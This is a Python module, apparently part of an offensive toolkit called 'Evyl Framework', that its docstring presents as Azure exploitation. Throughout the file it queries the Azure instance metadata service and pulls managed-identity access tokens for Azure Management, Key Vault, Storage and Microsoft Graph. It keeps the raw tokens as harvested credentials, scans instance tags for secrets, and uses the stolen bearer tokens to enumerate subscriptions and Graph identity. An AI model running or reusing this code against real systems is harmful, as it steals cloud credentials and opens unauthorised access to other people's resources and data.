"""
Azure Scanner for Evyl Framework

Comprehensive Azure exploitation including metadata service and managed identity enumeration.
"""

import asyncio
import aiohttp
import json
from typing import Dict, List, Any, Optional
from urllib.parse import urljoin

from utils.logger import Logger
from utils.network import NetworkManager

class AzureScanner:
    """Azure exploitation and enumeration scanner"""
    
    def __init__(self):
        self.logger = Logger()
        self.network_manager = NetworkManager()
        
        # Azure metadata endpoints
        self.metadata_base = "http://169.254.169.254"
        self.metadata_endpoints = [
            "/metadata/instance?api-version=2021-02-01",
            "/metadata/identity?api-version=2018-02-01",
            "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/",
            "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/",
            "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/",
            "/metadata/scheduledevents?api-version=2019-08-01",
            "/metadata/attested/document?api-version=2020-09-01",
        ]
        
    async def scan(self, target: str) -> Dict[str, Any]:
        """Main Azure scan function"""
        results = {
            'target': target,
            'vulnerabilities': [],
            'credentials': [],
            'metadata_access': False,
            'managed_identity_enabled': False,
            'access_tokens': [],
            'instance_info': {},
            'identity_info': {}
        }
        
        # Check metadata service access
        await self._check_metadata_access(results)
        
        # Enumerate metadata endpoints
        await self._enumerate_metadata(results)
        
        # Check for managed identity
        await self._check_managed_identity(results)
        
        # Extract access tokens
        await self._extract_access_tokens(results)
        
        # Get instance information
        await self._get_instance_info(results)
        
        return results
    
    async def _check_metadata_access(self, results: Dict[str, Any]):
        """Check basic metadata service access"""
        try:
            url = f"{self.metadata_base}/metadata/instance?api-version=2021-02-01"
            headers = {
                'Metadata': 'true',
                **self.network_manager.get_headers()
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as response:
                    if response.status == 200:
                        results['metadata_access'] = True
                        
                        results['vulnerabilities'].append({
                            'type': 'azure_metadata_access',
                            'severity': 'high',
                            'url': url,
                            'description': 'Azure metadata service accessible'
                        })
                        
                        self.logger.vulnerability_found('azure_metadata_exposure', url, 'high')
                        
        except Exception as e:
            self.logger.debug(f"Error checking metadata access: {e}")
    
    async def _enumerate_metadata(self, results: Dict[str, Any]):
        """Enumerate all metadata endpoints"""
        for endpoint in self.metadata_endpoints:
            try:
                url = f"{self.metadata_base}{endpoint}"
                headers = {
                    'Metadata': 'true',
                    **self.network_manager.get_headers()
                }
                
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as response:
                        if response.status == 200:
                            content = await response.text()
                            
                            # Store endpoint data
                            endpoint_name = endpoint.split('?')[0].replace('/metadata/', '').replace('/', '_')
                            if endpoint_name:
                                results['instance_info'][endpoint_name] = content
                            
                            self.logger.debug(f"Metadata endpoint accessible: {endpoint}")
                            
            except Exception as e:
                self.logger.debug(f"Error accessing {endpoint}: {e}")
    
    async def _check_managed_identity(self, results: Dict[str, Any]):
        """Check for managed identity availability"""
        try:
            identity_url = f"{self.metadata_base}/metadata/identity?api-version=2018-02-01"
            headers = {
                'Metadata': 'true',
                **self.network_manager.get_headers()
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.get(identity_url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as response:
                    if response.status == 200:
                        identity_text = await response.text()
                        
                        try:
                            identity_data = json.loads(identity_text)
                            results['managed_identity_enabled'] = True
                            results['identity_info'] = identity_data
                            
                            results['vulnerabilities'].append({
                                'type': 'azure_managed_identity_enabled',
                                'severity': 'medium',
                                'url': identity_url,
                                'description': 'Azure managed identity is enabled'
                            })
                            
                            self.logger.debug("Managed identity is enabled")
                            
                        except json.JSONDecodeError:
                            self.logger.debug("Invalid JSON in identity response")
                            
        except Exception as e:
            self.logger.debug(f"Error checking managed identity: {e}")
    
    async def _extract_access_tokens(self, results: Dict[str, Any]):
        """Extract access tokens for various Azure resources"""
        if not results['managed_identity_enabled']:
            return
        
        # Resource endpoints to get tokens for
        resources = {
            'azure_management': 'https://management.azure.com/',
            'azure_keyvault': 'https://vault.azure.net/',
            'azure_storage': 'https://storage.azure.com/',
            'microsoft_graph': 'https://graph.microsoft.com/'
        }
        
        for resource_name, resource_url in resources.items():
            try:
                token_url = f"{self.metadata_base}/metadata/identity/oauth2/token?api-version=2018-02-01&resource={resource_url}"
                headers = {
                    'Metadata': 'true',
                    **self.network_manager.get_headers()
                }
                
                async with aiohttp.ClientSession() as session:
                    async with session.get(token_url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as response:
                        if response.status == 200:
                            token_text = await response.text()
                            
                            try:
                                token_data = json.loads(token_text)
                                
                                access_token_info = {
                                    'type': 'azure_access_token',
                                    'resource': resource_name,
                                    'resource_url': resource_url,
                                    'access_token': token_data.get('access_token'),
                                    'token_type': token_data.get('token_type'),
                                    'expires_in': token_data.get('expires_in'),
                                    'expires_on': token_data.get('expires_on'),
                                    'not_before': token_data.get('not_before'),
                                    'client_id': token_data.get('client_id'),
                                    'url': token_url
                                }
                                
                                results['access_tokens'].append(access_token_info)
                                results['credentials'].append(access_token_info)
                                
                                self.logger.credential_found(f'azure_token_{resource_name}', token_url)
                                
                                results['vulnerabilities'].append({
                                    'type': 'azure_access_token_exposed',
                                    'severity': 'critical',
                                    'url': token_url,
                                    'resource': resource_name,
                                    'description': f'Azure access token exposed for resource: {resource_name}'
                                })
                                
                            except json.JSONDecodeError:
                                self.logger.debug(f"Invalid JSON in access token for {resource_name}")
                                
            except Exception as e:
                self.logger.debug(f"Error extracting access token for {resource_name}: {e}")
    
    async def _get_instance_info(self, results: Dict[str, Any]):
        """Get detailed instance information"""
        try:
            instance_url = f"{self.metadata_base}/metadata/instance?api-version=2021-02-01"
            headers = {
                'Metadata': 'true',
                **self.network_manager.get_headers()
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.get(instance_url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as response:
                    if response.status == 200:
                        instance_text = await response.text()
                        
                        try:
                            instance_data = json.loads(instance_text)
                            results['instance_info']['details'] = instance_data
                            
                            # Extract useful information
                            if 'compute' in instance_data:
                                compute_info = instance_data['compute']
                                self.logger.debug(f"Instance: {compute_info.get('name')} in {compute_info.get('location')}")
                                
                                # Check for sensitive information in tags
                                if 'tags' in compute_info:
                                    await self._check_tags_for_secrets(compute_info['tags'], results)
                            
                        except json.JSONDecodeError:
                            self.logger.debug("Invalid JSON in instance information")
                            
        except Exception as e:
            self.logger.debug(f"Error getting instance information: {e}")
    
    async def _check_tags_for_secrets(self, tags: Dict[str, str], results: Dict[str, Any]):
        """Check instance tags for sensitive information"""
        from patterns.regex_db import find_credentials
        
        for tag_name, tag_value in tags.items():
            # Check tag value for credentials
            found_creds = find_credentials(tag_value)
            
            for cred in found_creds:
                cred['source'] = 'azure_instance_tag'
                cred['tag_name'] = tag_name
                results['credentials'].append(cred)
                
                self.logger.credential_found(cred['type'], f"instance_tag_{tag_name}")
                
            # Check for sensitive tag names
            sensitive_tag_names = ['password', 'secret', 'key', 'token', 'credential']
            if any(sensitive in tag_name.lower() for sensitive in sensitive_tag_names):
                results['vulnerabilities'].append({
                    'type': 'sensitive_instance_tag',
                    'severity': 'medium',
                    'tag_name': tag_name,
                    'description': f'Instance tag contains potentially sensitive information: {tag_name}'
                })
    
    async def test_token_permissions(self, access_token: str, resource: str) -> Dict[str, Any]:
        """Test permissions of an access token"""
        permissions = {
            'resource': resource,
            'valid': False,
            'subscriptions': [],
            'resource_groups': [],
            'storage_accounts': []
        }
        
        headers = {
            'Authorization': f'Bearer {access_token}',
            **self.network_manager.get_headers()
        }
        
        if resource == 'azure_management':
            # Test Azure Management API
            try:
                subscriptions_url = "https://management.azure.com/subscriptions?api-version=2020-01-01"
                async with aiohttp.ClientSession() as session:
                    async with session.get(subscriptions_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        if response.status == 200:
                            permissions['valid'] = True
                            subs_data = await response.json()
                            permissions['subscriptions'] = [sub.get('subscriptionId') for sub in subs_data.get('value', [])]
            except:
                pass
        
        elif resource == 'microsoft_graph':
            # Test Microsoft Graph API
            try:
                me_url = "https://graph.microsoft.com/v1.0/me"
                async with aiohttp.ClientSession() as session:
                    async with session.get(me_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        if response.status == 200:
                            permissions['valid'] = True
            except:
                pass
        
        return permissions